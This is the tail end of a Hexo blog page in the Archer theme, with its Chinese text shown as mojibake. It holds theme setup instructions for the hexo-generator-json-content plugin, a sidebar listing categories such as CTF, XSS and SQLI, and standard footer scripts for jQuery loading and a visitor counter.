    ç¼ºå¤±æ¨¡å—ã€‚<br/>
    1ã€è¯·ç¡®ä¿nodeç‰ˆæœ¬å¤§äº6.2<br/>
    2ã€åœ¨åšå®¢æ ¹ç›®å½•ï¼ˆæ³¨æ„ä¸æ˜¯archeræ ¹ç›®å½•ï¼‰æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š<br/>
    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
    3ã€åœ¨æ ¹ç›®å½•_config.ymlé‡Œæ·»åŠ é…ç½®ï¼š
    <pre style="color: #787878; font-size: 0.6rem;">
jsonContent:
  meta: false
  pages: false
  posts:
    title: true
    date: true
    path: true
    text: false
    raw: false
    content: false
    slug: false
    updated: false
    comments: false
    link: false
    permalink: false
    excerpt: false
    categories: true
    tags: true</pre>
    </div> 
    <div class="sidebar-tags-list"></div>
</div>
        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    
        <span class="sidebar-category-name" data-categories="life"><span class="iconfont-archer">&#xe60a;</span>life</span>
    
        <span class="sidebar-category-name" data-categories="flask"><span class="iconfont-archer">&#xe60a;</span>flask</span>
    
        <span class="sidebar-category-name" data-categories="å†…ç½‘æ¸—é€"><span class="iconfont-archer">&#xe60a;</span>å†…ç½‘æ¸—é€</span>
    
        <span class="sidebar-category-name" data-categories="upload"><span class="iconfont-archer">&#xe60a;</span>upload</span>
    
        <span class="sidebar-category-name" data-categories="2020-ctf"><span class="iconfont-archer">&#xe60a;</span>2020-ctf</span>
    
        <span class="sidebar-category-name" data-categories="2020-2ctf"><span class="iconfont-archer">&#xe60a;</span>2020-2ctf</span>
    
        <span class="sidebar-category-name" data-categories="2019-ctf"><span class="iconfont-archer">&#xe60a;</span>2019-ctf</span>
    
        <span class="sidebar-category-name" data-categories="2021-ctf"><span class="iconfont-archer">&#xe60a;</span>2021-ctf</span>
    
        <span class="sidebar-category-name" data-categories="æ¼æ´å¤ç°"><span class="iconfont-archer">&#xe60a;</span>æ¼æ´å¤ç°</span>
    
        <span class="sidebar-category-name" data-categories="PHP"><span class="iconfont-archer">&#xe60a;</span>PHP</span>
    
        <span class="sidebar-category-name" data-categories="XSS"><span class="iconfont-archer">&#xe60a;</span>XSS</span>
    
        <span class="sidebar-category-name" data-categories="git"><span class="iconfont-archer">&#xe60a;</span>git</span>
    
        <span class="sidebar-category-name" data-categories="é¡¹ç›®-å·¥å…·"><span class="iconfont-archer">&#xe60a;</span>é¡¹ç›®-å·¥å…·</span>
    
        <span class="sidebar-category-name" data-categories="SQLI"><span class="iconfont-archer">&#xe60a;</span>SQLI</span>
    
        <span class="sidebar-category-name" data-categories="åŸºç¡€çŸ¥è¯†"><span class="iconfont-archer">&#xe60a;</span>åŸºç¡€çŸ¥è¯†</span>
    
        <span class="sidebar-category-name" data-categories="ç¯å¢ƒæ­å»º"><span class="iconfont-archer">&#xe60a;</span>ç¯å¢ƒæ­å»º</span>
    
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>
    </div>
</div> 
    <script>
    var siteMeta = {
        root: "/",
        author: "fe1w0"
    }
</script>
    <!-- CDN failover -->
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
    <script type="text/javascript">
        if (typeof window.$ === 'undefined')
        {
            console.warn('jquery load from jsdelivr failed, will load local script')
            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
        }
    </script>
    <script src="/scripts/main.js"></script>
    <!-- algolia -->
    
    <!-- busuanzi  -->
    
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
    <!-- CNZZ  -->
    
    </div>
    <!-- async load share.js -->
    
        <script src="/scripts/share.js" async></script>    
     
    </body>
</html>


